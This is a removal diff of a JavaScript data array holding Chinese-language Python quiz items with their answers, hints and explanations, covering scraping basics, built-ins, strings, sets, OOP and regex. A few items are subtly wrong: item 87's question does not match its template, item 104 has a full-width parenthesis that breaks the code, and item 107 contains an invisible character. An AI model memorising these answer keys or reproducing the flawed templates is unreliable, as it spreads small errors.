-                    explanation: "📌 请求头模拟浏览器访问。\n\n🔹 User-Agent最重要\n🔹 可以添加Cookie、Referer等\n\n🎯 这是反爬的基础应对策略"
-                },
-                {
-                    id: 48,
-                    title: "状态码检查",
-                    description: "判断请求成功",
-                    difficulty: 2,
-                    xp: 20,
-                    question: "补全代码，检查请求是否成功",
-                    template: "if response.___ == 200:\n    print('成功')",
-                    answer: "status_code",
-                    hint: "HTTP状态码的属性名？",
-                    explanation: "📌 常见HTTP状态码：\n\n🔹 200 - 成功\n🔹 404 - 未找到\n🔹 403 - 禁止访问\n🔹 500 - 服务器错误"
-                },
-                {
-                    id: 49,
-                    title: "获取属性",
-                    description: "提取HTML属性",
-                    difficulty: 3,
-                    xp: 25,
-                    question: "补全代码，获取a标签的href属性",
-                    template: "link = soup.find('a')\nurl = link[___]",
-                    answer: "'href'",
-                    hint: "像字典一样获取属性",
-                    explanation: "📌 获取HTML元素属性：\n\n🔹 element['属性名']\n🔹 element.get('属性名', 默认值)"
-                },
-                {
-                    id: 50,
-                    title: "CSS选择器",
-                    description: "精确选择元素",
-                    difficulty: 3,
-                    xp: 30,
-                    question: "补全代码，用CSS选择器查找",
-                    template: "items = soup.___('div.content')",
-                    answer: "select",
-                    hint: "CSS选择器方法名？",
-                    explanation: "📌 select()使用CSS选择器。\n\n🔹 '.class' - 类选择器\n🔹 '#id' - ID选择器\n🔹 'div > p' - 直接子元素"
-                },
-                // ===== 类型转换 =====
-                {
-                    id: 51,
-                    title: "转整数",
-                    description: "字符串转数字",
-                    difficulty: 1,
-                    xp: 10,
-                    question: "补全代码，将字符串转为整数",
-                    template: "s = '123'\nnum = ___(s)\nprint(num + 1)  # 124",
-                    answer: "int",
-                    hint: "整数的英文缩写？",
-                    explanation: "📌 int()将值转为整数。\n\n🔹 int('123') → 123\n🔹 int(3.7) → 3（截断）\n🔹 int('12', 16) → 18（16进制）"
-                },
-                {
-                    id: 52,
-                    title: "转字符串",
-                    description: "数字转字符串",
-                    difficulty: 1,
-                    xp: 10,
-                    question: "补全代码，将数字转为字符串",
-                    template: "num = 123\ns = ___(num)\nprint('数字是：' + s)",
-                    answer: "str",
-                    hint: "字符串的英文缩写？",
-                    explanation: "📌 str()将值转为字符串。\n\n🔹 str(123) → '123'\n🔹 str(3.14) → '3.14'\n🔹 str([1,2]) → '[1, 2]'"
-                },
-                {
-                    id: 53,
-                    title: "转浮点数",
-                    description: "转为小数",
-                    difficulty: 1,
-                    xp: 10,
-                    question: "补全代码，将字符串转为浮点数",
-                    template: "s = '3.14'\npi = ___(s)\nprint(pi * 2)",
-                    answer: "float",
-                    hint: "浮点数的英文？",
-                    explanation: "📌 float()转为浮点数。\n\n🔹 float('3.14') → 3.14\n🔹 float(3) → 3.0"
-                },
-                {
-                    id: 54,
-                    title: "转列表",
-                    description: "字符串转列表",
-                    difficulty: 1,
-                    xp: 10,
-                    question: "补全代码，将字符串转为字符列表",
-                    template: "s = 'hello'\nchars = ___(s)\nprint(chars)  # ['h','e','l','l','o']",
-                    answer: "list",
-                    hint: "列表的英文？",
-                    explanation: "📌 list()将可迭代对象转为列表。\n\n🔹 list('abc') → ['a','b','c']\n🔹 list(range(3)) → [0,1,2]"
-                },
-                {
-                    id: 55,
-                    title: "转布尔值",
-                    description: "判断真假",
-                    difficulty: 1,
-                    xp: 10,
-                    question: "补全代码，判断值是否为真",
-                    template: "if ___(1):\n    print('真')",
-                    answer: "bool",
-                    hint: "布尔的英文？",
-                    explanation: "📌 bool()转为布尔值。\n\n🔹 假值：0, '', [], {}, None\n🔹 其他都是True"
-                },
-                // ===== 字符串格式化 =====
-                {
-                    id: 56,
-                    title: "f-string",
-                    description: "格式化字符串",
-                    difficulty: 1,
-                    xp: 15,
-                    question: "补全代码，使用f-string格式化",
-                    template: "name = '小明'\nage = 18\nprint(___'{name}今年{age}岁')",
-                    answer: "f",
-                    hint: "f-string以什么字母开头？",
-                    explanation: "📌 f-string是最现代的格式化方式。\n\n🔹 f'{变量}' 直接嵌入变量\n🔹 f'{1+1}' 可以计算表达式\n🔹 f'{x:.2f}' 保留2位小数"
-                },
-                {
-                    id: 57,
-                    title: "format方法",
-                    description: "字符串格式化",
-                    difficulty: 2,
-                    xp: 15,
-                    question: "补全代码，用format格式化",
-                    template: "text = '{}今年{}岁'.___('小明', 18)\nprint(text)",
-                    answer: "format",
-                    hint: "格式化方法名？",
-                    explanation: "📌 format()是通用的格式化方法。\n\n🔹 '{} {}'.format(a, b)\n🔹 '{0} {1}'.format(a, b) 指定位置\n🔹 '{name}'.format(name='值') 命名参数"
-                },
-                {
-                    id: 58,
-                    title: "大写转换",
-                    description: "字符串转大写",
-                    difficulty: 1,
-                    xp: 10,
-                    question: "补全代码，将字符串转为大写",
-                    template: "s = 'hello'\nprint(s.___())  # HELLO",
-                    answer: "upper",
-                    hint: "大写的英文？",
-                    explanation: "📌 大小写转换方法：\n\n🔹 upper() - 全大写\n🔹 lower() - 全小写\n🔹 title() - 首字母大写\n🔹 capitalize() - 句首大写"
-                },
-                {
-                    id: 59,
-                    title: "字符串查找",
-                    description: "查找子串位置",
-                    difficulty: 1,
-                    xp: 10,
-                    question: "补全代码，查找子串首次出现位置",
-                    template: "s = 'hello world'\npos = s.___('world')\nprint(pos)  # 6",
-                    answer: "find",
-                    hint: "查找的英文？",
-                    explanation: "📌 find()返回子串位置。\n\n🔹 找到返回索引\n🔹 找不到返回-1\n🔹 index()类似但找不到会报错"
-                },
-                {
-                    id: 60,
-                    title: "字符串判断",
-                    description: "判断是否全是数字",
-                    difficulty: 1,
-                    xp: 10,
-                    question: "补全代码，判断字符串是否全是数字",
-                    template: "s = '12345'\nif s.___():\n    print('全是数字')",
-                    answer: "isdigit",
-                    hint: "is开头，数字是digit",
-                    explanation: "📌 字符串判断方法：\n\n🔹 isdigit() - 全是数字\n🔹 isalpha() - 全是字母\n🔹 isalnum() - 字母或数字\n🔹 isspace() - 全是空白"
-                },
-                // ===== 集合操作 =====
-                {
-                    id: 61,
-                    title: "创建集合",
-                    description: "使用set",
-                    difficulty: 2,
-                    xp: 15,
-                    question: "补全代码，创建一个集合",
-                    template: "nums = ___([1, 2, 2, 3, 3, 3])\nprint(nums)  # {1, 2, 3}",
-                    answer: "set",
-                    hint: "集合的英文？",
-                    explanation: "📌 set是无序不重复的集合。\n\n🔹 自动去重\n🔹 可用于列表去重\n🔹 支持集合运算（交集、并集）"
-                },
-                {
-                    id: 62,
-                    title: "集合添加",
-                    description: "向集合添加元素",
-                    difficulty: 2,
-                    xp: 15,
-                    question: "补全代码，向集合添加元素",
-                    template: "s = {1, 2, 3}\ns.___(4)\nprint(s)",
-                    answer: "add",
-                    hint: "添加单个元素的方法？",
-                    explanation: "📌 集合添加方法：\n\n🔹 add(x) - 添加一个元素\n🔹 update([x,y]) - 添加多个\n🔹 已存在的元素不会重复添加"
-                },
-                {
-                    id: 63,
-                    title: "集合交集",
-                    description: "两个集合的公共元素",
-                    difficulty: 2,
-                    xp: 20,
-                    question: "补全代码，求两个集合的交集",
-                    template: "a = {1, 2, 3}\nb = {2, 3, 4}\nprint(a.___(b))  # {2, 3}",
-                    answer: "intersection",
-                    hint: "交集的英文？或用 &",
-                    explanation: "📌 集合运算：\n\n🔹 intersection() 或 & → 交集\n🔹 union() 或 | → 并集\n🔹 difference() 或 - → 差集"
-                },
-                // ===== 元组 =====
-                {
-                    id: 64,
-                    title: "创建元组",
-                    description: "不可变序列",
-                    difficulty: 1,
-                    xp: 10,
-                    question: "补全代码，创建元组",
-                    template: "point = ___(3, 4)\nprint(point[0])  # 3",
-                    answer: "tuple",
-                    hint: "元组的英文？或直接用小括号",
-                    explanation: "📌 元组是不可变的序列。\n\n🔹 创建：(1, 2) 或 tuple([1,2])\n🔹 单元素：(1,) 注意逗号\n🔹 不能修改，但可以拆包"
-                },
-                {
-                    id: 65,
-                    title: "元组拆包",
-                    description: "分别赋值",
-                    difficulty: 2,
-                    xp: 15,
-                    question: "补全代码，交换两个变量的值",
-                    template: "a = 1\nb = 2\na, b = ___, ___\nprint(a, b)  # 2 1",
-                    answer: "b, a",
-                    hint: "直接交换位置",
-                    explanation: "📌 Python独特的交换方式。\n\n🔹 a, b = b, a 一行交换\n🔹 实际上是元组拆包\n🔹 无需临时变量"
-                },
-                // ===== 更多内置函数 =====
-                {
-                    id: 66,
-                    title: "求最大值",
-                    description: "找出最大的",
-                    difficulty: 1,
-                    xp: 10,
-                    question: "补全代码，找出列表中的最大值",
-                    template: "nums = [3, 1, 4, 1, 5]\nprint(___(nums))  # 5",
-                    answer: "max",
-                    hint: "最大的英文缩写？",
-                    explanation: "📌 max()求最大值。\n\n🔹 max([1,2,3]) → 3\n🔹 max(1, 2, 3) → 3\n🔹 max(列表, key=函数) 自定义比较"
-                },
-                {
-                    id: 67,
-                    title: "求最小值",
-                    description: "找出最小的",
-                    difficulty: 1,
-                    xp: 10,
-                    question: "补全代码，找出列表中的最小值",
-                    template: "nums = [3, 1, 4, 1, 5]\nprint(___(nums))  # 1",
-                    answer: "min",
-                    hint: "最小的英文缩写？",
-                    explanation: "📌 min()求最小值。\n\n🔹 用法同max()\n🔹 可用于字符串比较（按字典序）"
-                },
-                {
-                    id: 68,
-                    title: "求和",
-                    description: "计算总和",
-                    difficulty: 1,
-                    xp: 10,
-                    question: "补全代码，计算列表元素的和",
-                    template: "nums = [1, 2, 3, 4, 5]\nprint(___(nums))  # 15",
-                    answer: "sum",
-                    hint: "求和的英文？",
-                    explanation: "📌 sum()计算可迭代对象的和。\n\n🔹 sum([1,2,3]) → 6\n🔹 sum(range(101)) → 5050\n🔹 sum(列表, 起始值)"
-                },
-                {
-                    id: 69,
-                    title: "绝对值",
-                    description: "求绝对值",
-                    difficulty: 1,
-                    xp: 10,
-                    question: "补全代码，求绝对值",
-                    template: "x = -5\nprint(___(x))  # 5",
-                    answer: "abs",
-                    hint: "绝对值absolute的缩写？",
-                    explanation: "📌 abs()求绝对值。\n\n🔹 abs(-5) → 5\n🔹 abs(3.14) → 3.14\n🔹 也适用于复数"
-                },
-                {
-                    id: 70,
-                    title: "四舍五入",
-                    description: "取整数",
-                    difficulty: 1,
-                    xp: 10,
-                    question: "补全代码，四舍五入保留整数",
-                    template: "x = 3.7\nprint(___(x))  # 4",
-                    answer: "round",
-                    hint: "四舍五入的英文？",
-                    explanation: "📌 round()四舍五入。\n\n🔹 round(3.7) → 4\n🔹 round(3.1415, 2) → 3.14\n🔹 注意银行家舍入法"
-                },
-                {
-                    id: 71,
-                    title: "枚举索引",
-                    description: "同时获取索引和值",
-                    difficulty: 2,
-                    xp: 20,
-                    question: "补全代码，遍历时获取索引",
-                    template: "fruits = ['苹果', '香蕉']\nfor i, f in ___(fruits):\n    print(i, f)",
-                    answer: "enumerate",
-                    hint: "枚举的英文？",
-                    explanation: "📌 enumerate()返回索引和值。\n\n🔹 for i, v in enumerate(list):\n🔹 可指定起始索引：enumerate(list, 1)"
-                },
-                {
-                    id: 72,
-                    title: "并行遍历",
-                    description: "同时遍历多个列表",
-                    difficulty: 2,
-                    xp: 20,
-                    question: "补全代码，同时遍历两个列表",
-                    template: "a = [1, 2, 3]\nb = ['a', 'b', 'c']\nfor x, y in ___(a, b):\n    print(x, y)",
-                    answer: "zip",
-                    hint: "拉链的英文？",
-                    explanation: "📌 zip()并行遍历多个序列。\n\n🔹 长度不一时取最短的\n🔹 可用于字典创建：dict(zip(keys, values))"
-                },
-                {
-                    id: 73,
-                    title: "map映射",
-                    description: "对每个元素应用函数",
-                    difficulty: 3,
-                    xp: 25,
-                    question: "补全代码，将列表每个数字平方",
-                    template: "nums = [1, 2, 3]\nresult = list(___(lambda x: x**2, nums))\nprint(result)  # [1, 4, 9]",
-                    answer: "map",
-                    hint: "映射的英文？",
-                    explanation: "📌 map()对每个元素应用函数。\n\n🔹 map(函数, 序列)\n🔹 返回迭代器，需list()转换\n🔹 常与lambda配合"
-                },
-                {
-                    id: 74,
-                    title: "filter过滤",
-                    description: "筛选符合条件的元素",
-                    difficulty: 3,
-                    xp: 25,
-                    question: "补全代码，筛选出偶数",
-                    template: "nums = [1, 2, 3, 4, 5]\nresult = list(___(lambda x: x%2==0, nums))\nprint(result)  # [2, 4]",
-                    answer: "filter",
-                    hint: "过滤的英文？",
-                    explanation: "📌 filter()筛选符合条件的元素。\n\n🔹 filter(条件函数, 序列)\n🔹 条件函数返回True的元素保留"
-                },
-                {
-                    id: 75,
-                    title: "sorted排序",
-                    description: "返回新的有序列表",
-                    difficulty: 2,
-                    xp: 15,
-                    question: "补全代码，对列表排序（不改变原列表）",
-                    template: "nums = [3, 1, 4]\nnew_nums = ___(nums)\nprint(new_nums)  # [1, 3, 4]",
-                    answer: "sorted",
-                    hint: "sort的过去式？",
-                    explanation: "📌 sorted()返回新的有序列表。\n\n🔹 原列表不变\n🔹 sorted(x, reverse=True) 降序\n🔹 sorted(x, key=len) 按长度排序"
-                },
-                // ===== 更多技巧 =====
-                {
-                    id: 76,
-                    title: "any判断",
-                    description: "任一为True",
-                    difficulty: 2,
-                    xp: 15,
-                    question: "补全代码，判断是否有任一元素为True",
-                    template: "nums = [0, 0, 1, 0]\nif ___(nums):\n    print('有真值')",
-                    answer: "any",
-                    hint: "任一的英文？",
-                    explanation: "📌 any()判断是否有任一True。\n\n🔹 any([False,True,False]) → True\n🔹 any([]) → False\n🔹 常用于条件判断"
-                },
-                {
-                    id: 77,
-                    title: "all判断",
-                    description: "全部为True",
-                    difficulty: 2,
-                    xp: 15,
-                    question: "补全代码，判断是否全部为True",
-                    template: "nums = [1, 2, 3]\nif ___(nums):\n    print('全为真')",
-                    answer: "all",
-                    hint: "全部的英文？",
-                    explanation: "📌 all()判断是否全部True。\n\n🔹 all([True,True,True]) → True\n🔹 all([True,False]) → False\n🔹 all([]) → True（空为真）"
-                },
-                {
-                    id: 78,
-                    title: "isinstance类型检查",
-                    description: "检查类型",
-                    difficulty: 2,
-                    xp: 20,
-                    question: "补全代码，检查是否是字符串类型",
-                    template: "x = 'hello'\nif ___(x, str):\n    print('是字符串')",
-                    answer: "isinstance",
-                    hint: "is instance of...",
-                    explanation: "📌 isinstance()检查类型。\n\n🔹 isinstance(x, int)\n🔹 isinstance(x, (int, float)) 多类型\n🔹 比type()更推荐"
-                },
-                {
-                    id: 79,
-                    title: "input输入",
-                    description: "获取用户输入",
-                    difficulty: 1,
-                    xp: 10,
-                    question: "补全代码，获取用户输入的名字",
-                    template: "name = ___('请输入你的名字：')\nprint('你好，' + name)",
-                    answer: "input",
-                    hint: "输入的英文？",
-                    explanation: "📌 input()获取用户输入。\n\n🔹 返回字符串类型\n🔹 需要数字时要转换：int(input())"
-                },
-                {
-                    id: 80,
-                    title: "type类型",
-                    description: "获取类型",
-                    difficulty: 1,
-                    xp: 10,
-                    question: "补全代码，获取变量的类型",
-                    template: "x = 123\nprint(___(x))  # <class 'int'>",
-                    answer: "type",
-                    hint: "类型的英文？",
-                    explanation: "📌 type()返回对象类型。\n\n🔹 type(123) → <class 'int'>\n🔹 type('a') → <class 'str'>\n🔹 用于调试"
-                },
-                // ===== 更多字符串 =====
-                {
-                    id: 81,
-                    title: "startswith",
-                    description: "判断开头",
-                    difficulty: 1,
-                    xp: 10,
-                    question: "补全代码，判断字符串是否以'http'开头",
-                    template: "url = 'https://example.com'\nif url.___('http'):\n    print('是网址')",
-                    answer: "startswith",
-                    hint: "以...开始",
-                    explanation: "📌 startswith()判断开头。\n\n🔹 s.startswith('前缀')\n🔹 可传入元组检查多个：s.startswith(('http','https'))"
-                },
-                {
-                    id: 82,
-                    title: "endswith",
-                    description: "判断结尾",
-                    difficulty: 1,
-                    xp: 10,
-                    question: "补全代码，判断文件是否是.py结尾",
-                    template: "filename = 'test.py'\nif filename.___('.py'):\n    print('是Python文件')",
-                    answer: "endswith",
-                    hint: "以...结束",
-                    explanation: "📌 endswith()判断结尾。\n\n🔹 常用于检查文件扩展名\n🔹 可传入元组检查多个"
-                },
-                {
-                    id: 83,
-                    title: "count计数",
-                    description: "统计出现次数",
-                    difficulty: 1,
-                    xp: 10,
-                    question: "补全代码，统计字母a出现的次数",
-                    template: "s = 'abracadabra'\nprint(s.___('a'))  # 5",
-                    answer: "count",
-                    hint: "计数的英文？",
-                    explanation: "📌 count()统计出现次数。\n\n🔹 字符串和列表都有此方法\n🔹 s.count('子串')\n🔹 list.count(元素)"
-                },
-                {
-                    id: 84,
-                    title: "center居中",
-                    description: "字符串居中填充",
-                    difficulty: 2,
-                    xp: 15,
-                    question: "补全代码，将字符串居中到10个字符宽",
-                    template: "s = 'hello'\nprint(s.___(10, '*'))  # **hello***",
-                    answer: "center",
-                    hint: "居中的英文？",
-                    explanation: "📌 字符串填充方法：\n\n🔹 center(宽度, 填充字符) - 居中\n🔹 ljust() - 左对齐\n🔹 rjust() - 右对齐\n🔹 zfill() - 左边填0"
-                },
-                // ===== 更多列表 =====
-                {
-                    id: 85,
-                    title: "列表复制",
-                    description: "创建列表副本",
-                    difficulty: 2,
-                    xp: 15,
-                    question: "补全代码，复制列表",
-                    template: "a = [1, 2, 3]\nb = a.___()\nb.append(4)\nprint(a)  # [1, 2, 3] 原列表不变",
-                    answer: "copy",
-                    hint: "复制的英文？",
-                    explanation: "📌 copy()创建浅拷贝。\n\n🔹 b = a.copy() 或 b = a[:]\n🔹 浅拷贝只复制一层\n🔹 深拷贝用copy.deepcopy()"
-                },
-                {
-                    id: 86,
-                    title: "列表清空",
-                    description: "删除所有元素",
-                    difficulty: 1,
-                    xp: 10,
-                    question: "补全代码，清空列表",
-                    template: "nums = [1, 2, 3]\nnums.___()\nprint(nums)  # []",
-                    answer: "clear",
-                    hint: "清除的英文？",
-                    explanation: "📌 clear()清空列表。\n\n🔹 等同于 del nums[:]\n🔹 字典也有clear()方法"
-                },
-                {
-                    id: 87,
-                    title: "列表插入",
-                    description: "在指定位置插入",
-                    difficulty: 2,
-                    xp: 15,
-                    question: "补全代码，在索引1处插入'x'",
-                    template: "a = ['a', 'c']\na.___(1, 'b')\nprint(a)  # ['a', 'b', 'c']",
-                    answer: "insert",
-                    hint: "插入的英文？",
-                    explanation: "📌 insert(索引, 元素)在指定位置插入。\n\n🔹 insert(0, x) 插入开头\n🔹 insert(len(a), x) 等同append"
-                },
-                {
-                    id: 88,
-                    title: "列表弹出",
-                    description: "删除并返回元素",
-                    difficulty: 2,
-                    xp: 15,
-                    question: "补全代码，删除并返回最后一个元素",
-                    template: "nums = [1, 2, 3]\nlast = nums.___()\nprint(last)  # 3",
-                    answer: "pop",
-                    hint: "弹出的英文？",
-                    explanation: "📌 pop()删除并返回元素。\n\n🔹 pop() - 最后一个\n🔹 pop(0) - 第一个\n🔹 pop(i) - 指定索引"
-                },
-                // ===== 更多逻辑 =====
-                {
-                    id: 89,
-                    title: "三元表达式",
-                    description: "简洁的条件判断",
-                    difficulty: 2,
-                    xp: 20,
-                    question: "补全代码，用三元表达式判断奇偶",
-                    template: "x = 5\nresult = '奇数' ___ x % 2 else '偶数'\nprint(result)",
-                    answer: "if",
-                    hint: "条件表达式的关键字？",
-                    explanation: "📌 三元表达式：值1 if 条件 else 值2\n\n🔹 result = a if a > b else b\n🔹 简化if-else为一行\n🔹 可以嵌套但不推荐"
-                },
-                {
-                    id: 90,
-                    title: "in成员检查",
-                    description: "判断元素是否存在",
-                    difficulty: 1,
-                    xp: 10,
-                    question: "补全代码，判断元素是否在列表中",
-                    template: "fruits = ['苹果', '香蕉']\nif '苹果' ___ fruits:\n    print('有苹果')",
-                    answer: "in",
-                    hint: "在...里面",
-                    explanation: "📌 in判断成员关系。\n\n🔹 x in list - 在列表中\n🔹 key in dict - 键在字典中\n🔹 char in str - 字符在字符串中"
-                },
-                {
-                    id: 91,
-                    title: "not in排除",
-                    description: "判断元素不存在",
-                    difficulty: 1,
-                    xp: 10,
-                    question: "补全代码，判断元素不在列表中",
-                    template: "fruits = ['苹果', '香蕉']\nif '橙子' ___ fruits:\n    print('没有橙子')",
-                    answer: "not in",
-                    hint: "不在...里面",
-                    explanation: "📌 not in判断不存在。\n\n🔹 与 in 相反\n🔹 常用于过滤检查"
-                },
-                {
-                    id: 92,
-                    title: "is比较",
-                    description: "判断是否同一对象",
-                    difficulty: 2,
-                    xp: 15,
-                    question: "补全代码，判断变量是否为None",
-                    template: "x = None\nif x ___ None:\n    print('是空值')",
-                    answer: "is",
-                    hint: "是否同一对象？",
-                    explanation: "📌 is判断是否同一对象。\n\n🔹 x is None（推荐）\n🔹 x == None（不推荐）\n🔹 is比较内存地址，==比较值"
-                },
-                // ===== 更多异常 =====
-                {
-                    id: 93,
-                    title: "finally始终执行",
-                    description: "无论如何都执行",
-                    difficulty: 3,
-                    xp: 25,
-                    question: "补全代码，确保资源被释放",
-                    template: "try:\n    f = open('file.txt')\nexcept:\n    pass\n___:\n    print('清理资源')",
-                    answer: "finally",
-                    hint: "最终的英文？",
-                    explanation: "📌 finally块始终执行。\n\n🔹 常用于清理资源\n🔹 即使有return也会执行\n🔹 文件操作推荐用with"
-                },
-                {
-                    id: 94,
-                    title: "raise抛出异常",
-                    description: "主动引发错误",
-                    difficulty: 3,
-                    xp: 25,
-                    question: "补全代码，主动抛出异常",
-                    template: "age = -1\nif age < 0:\n    ___ ValueError('年龄不能为负')",
-                    answer: "raise",
-                    hint: "抛出的英文？",
-                    explanation: "📌 raise主动抛出异常。\n\n🔹 raise 异常类型('消息')\n🔹 用于参数验证\n🔹 可以自定义异常类"
-                },
-                // ===== 更多OOP =====
-                {
-                    id: 95,
-                    title: "self参数",
-                    description: "类方法的第一个参数",
-                    difficulty: 2,
-                    xp: 20,
-                    question: "补全代码，定义类的方法",
-                    template: "class Dog:\n    def bark(___):\n        print('汪汪！')",
-                    answer: "self",
-                    hint: "代表实例自身的参数？",
-                    explanation: "📌 self代表类的实例。\n\n🔹 必须是第一个参数\n🔹 通过self访问属性和方法\n🔹 类似其他语言的this"
-                },
-                {
-                    id: 96,
-                    title: "__init__构造",
-                    description: "初始化方法",
-                    difficulty: 3,
-                    xp: 25,
-                    question: "补全代码，定义构造方法",
-                    template: "class Person:\n    def ___(self, name):\n        self.name = name",
-                    answer: "__init__",
-                    hint: "初始化方法的名称？",
-                    explanation: "📌 __init__是构造方法。\n\n🔹 创建对象时自动调用\n🔹 用于初始化属性\n🔹 双下划线开头结尾是魔术方法"
-                },
-                {
-                    id: 97,
-                    title: "继承",
-                    description: "类的继承",
-                    difficulty: 3,
-                    xp: 30,
-                    question: "补全代码，让Dog继承Animal类",
-                    template: "class Animal:\n    pass\n\nclass Dog(___):\n    pass",
-                    answer: "Animal",
-                    hint: "填入父类名",
-                    explanation: "📌 继承让子类拥有父类的属性和方法。\n\n🔹 class 子类(父类):\n🔹 可以重写父类方法\n🔹 super()调用父类方法"
-                },
-                {
-                    id: 98,
-                    title: "super调用",
-                    description: "调用父类方法",
-                    difficulty: 3,
-                    xp: 30,
-                    question: "补全代码，调用父类的__init__",
-                    template: "class Dog(Animal):\n    def __init__(self, name):\n        ___.__init__(name)\n        self.species = 'dog'",
-                    answer: "super()",
-                    hint: "超类的英文？",
-                    explanation: "📌 super()调用父类。\n\n🔹 super().__init__() 调用父类构造\n🔹 super().方法() 调用父类方法\n🔹 多继承时按MRO顺序"
-                },
-                // ===== 实用技巧 =====
-                {
-                    id: 99,
-                    title: "列表解包",
-                    description: "展开列表",
-                    difficulty: 2,
-                    xp: 20,
-                    question: "补全代码，将列表展开传入函数",
-                    template: "def add(a, b, c):\n    return a + b + c\n\nnums = [1, 2, 3]\nprint(add(___nums))",
-                    answer: "*",
-                    hint: "用什么符号展开列表？",
-                    explanation: "📌 *展开列表，**展开字典。\n\n🔹 func(*list) 展开为位置参数\n🔹 func(**dict) 展开为关键字参数\n🔹 [*a, *b] 合并列表"
-                },
-                {
-                    id: 100,
-                    title: "字典解包",
-                    description: "展开字典",
-                    difficulty: 2,
-                    xp: 20,
-                    question: "补全代码，合并两个字典",
-                    template: "a = {'x': 1}\nb = {'y': 2}\nc = {___a, ___b}\nprint(c)  # {'x': 1, 'y': 2}",
-                    answer: "**",
-                    hint: "字典解包用几个星号？",
-                    explanation: "📌 **展开字典。\n\n🔹 {**d1, **d2} 合并字典\n🔹 Python 3.9+可用 d1 | d2\n🔹 相同键后面覆盖前面"
-                },
-                // ===== 正则表达式 =====
-                {
-                    id: 101,
-                    title: "匹配数字",
-                    description: "正则匹配所有数字",
-                    difficulty: 2,
-                    xp: 25,
-                    question: "用正则表达式匹配所有数字",
-                    template: "import re\ntext = 'abc123def456'\nnums = re.findall(r'___', text)\nprint(nums)  # ['123', '456']",
-                    answer: "\\d+",
-                    hint: "\\d匹配数字，+表示一个或多个",
-                    explanation: "📌 \\d 匹配数字字符。\n\n🔹 \\d 等价于 [0-9]\n🔹 + 表示匹配1个或多个\n🔹 findall返回所有匹配"
-                },
-                {
-                    id: 102,
-                    title: "匹配邮箱",
-                    description: "正则匹配邮箱格式",
-                    difficulty: 2,
-                    xp: 30,
-                    question: "补全邮箱匹配的正则表达式",
-                    template: "import re\nemail = 'test@example.com'\nif re.match(r'\\w+___\\w+\\.\\w+', email):\n    print('有效邮箱')",
-                    answer: "@",
-                    hint: "@符号在邮箱中间",
-                    explanation: "📌 邮箱格式：用户名@域名.后缀\n\n🔹 \\w 匹配字母数字下划线\n🔹 \\. 匹配点号(需转义)\n🔹 + 表示至少一个字符"
-                },
-                {
-                    id: 103,
-                    title: "替换文本",
-                    description: "用re.sub替换文本",
-                    difficulty: 2,
-                    xp: 25,
-                    question: "用正则替换所有数字为*",
-                    template: "import re\ntext = 'phone: 12345'\nresult = re.___(r'\\d', '*', text)\nprint(result)  # phone: *****",
-                    answer: "sub",
-                    hint: "substitute的缩写",
-                    explanation: "📌 re.sub(pattern, repl, string) 替换匹配内容。\n\n🔹 第一参数：正则模式\n🔹 第二参数：替换内容\n🔹 第三参数：原字符串"
-                },
-                {
-                    id: 104,
-                    title: "分组提取",
-                    description: "用括号分组提取",
-                    difficulty: 3,
-                    xp: 35,
-                    question: "用分组提取年月日",
-                    template: "import re\ndate = '2024-01-15'\nm = re.match(r'(\\d+)-(\\d+)-(\\d+)', date)\nyear = m.___（1)\nprint(year)  # 2024",
-                    answer: "group",
-                    hint: "获取分组内容的方法",
-                    explanation: "📌 用()创建分组，group(n)获取第n组。\n\n🔹 group(0)返回整个匹配\n🔹 group(1)返回第一个括号内容\n🔹 groups()返回所有分组的元组"
-                },
-                {
-                    id: 105,
-                    title: "忽略大小写",
-                    description: "正则忽略大小写匹配",
-                    difficulty: 2,
-                    xp: 20,
-                    question: "忽略大小写匹配hello",
-                    template: "import re\ntext = 'Hello World'\nif re.search('hello', text, re.___):\n    print('找到了')",
-                    answer: "IGNORECASE",
-                    hint: "忽略大小写的标志",
-                    explanation: "📌 re.IGNORECASE 或 re.I 忽略大小写。\n\n🔹 也可写作 re.I\n🔹 flags参数可组合使用\n🔹 如 re.I | re.M"
-                },
-                // ===== 字典进阶 =====
-                {
-                    id: 106,
-                    title: "字典推导式",
-                    description: "用推导式创建字典",
-                    difficulty: 2,
-                    xp: 25,
-                    question: "用推导式创建平方字典",
-                    template: "squares = {x: x**2 ___ x in range(5)}\nprint(squares)  # {0:0, 1:1, 2:4, 3:9, 4:16}",
-                    answer: "for",
-                    hint: "和列表推导式类似",
-                    explanation: "📌 字典推导式 {key: value for item in iterable}\n\n🔹 冒号左边是键\n🔹 冒号右边是值\n🔹 可加if条件过滤"
-                },
-                {
-                    id: 107,
-                    title: "setdefault",
-                    description: "设置默认值",
-                    difficulty: 2,
-                    xp: 25,
-                    question: "用setdefault设置默认值",
-                    template: "d = {'a': 1}\nval = d.___(​'b', 0)\nprint(val)  # 0\nprint(d)  # {'a': 1, 'b': 0}",
-                    answer: "setdefault",
-                    hint: "set + default",
-                    explanation: "📌 setdefault(key, default) 键不存在时设置默认值。\n\n🔹 键存在返回原值\n🔹 键不存在设置并返回默认值\n🔹 比get更强大"
-                },
-                {
-                    id: 108,
-                    title: "字典排序",
-                    description: "按值排序字典",
-                    difficulty: 2,
-                    xp: 30,
-                    question: "按字典的值排序",
-                    template: "d = {'b': 2, 'a': 1, 'c': 3}\nsorted_d = sorted(d.items(), key=lambda x: x[___])\nprint(sorted_d)",
-                    answer: "1",
-                    hint: "x[0]是键，x[?]是值",
-                    explanation: "📌 items()返回(key, value)元组。\n\n🔹 x[0]是键，x[1]是值\n🔹 sorted()默认升序\n🔹 reverse=True降序"
-                },
-                {
-                    id: 109,
-                    title: "Counter计数",
-                    description: "用Counter统计频率",
-                    difficulty: 2,
-                    xp: 25,
-                    question: "用Counter统计字符出现次数",
-                    template: "from collections import ___\ntext = 'hello'\ncount = ___(text)\nprint(count['l'])  # 2",
-                    answer: "Counter",
-                    hint: "计数器类",
-                    explanation: "📌 Counter是字典子类，专门用于计数。\n\n🔹 自动统计元素出现次数\n🔹 most_common(n)返回最常见n个\n🔹 可以做加减运算"
-                },
-                {
-                    id: 110,
-                    title: "defaultdict",
-                    description: "带默认值的字典",
-                    difficulty: 2,
-                    xp: 25,
-                    question: "创建默认值为列表的字典",
-                    template: "from collections import defaultdict\nd = defaultdict(___)\nd['a'].append(1)\nprint(d)  # {'a': [1]}",
-                    answer: "list",
-                    hint: "默认值是什么类型？",
-                    explanation: "📌 defaultdict(factory) 访问不存在的键自动创建默认值。\n\n🔹 list创建空列表\n🔹 int创建0\n🔹 避免KeyError"
-                },
-                // ===== 函数进阶 =====
-                {
-                    id: 111,
-                    title: "默认参数",
-                    description: "函数默认参数值",
-                    difficulty: 1,
-                    xp: 15,
-                    question: "设置默认参数值",
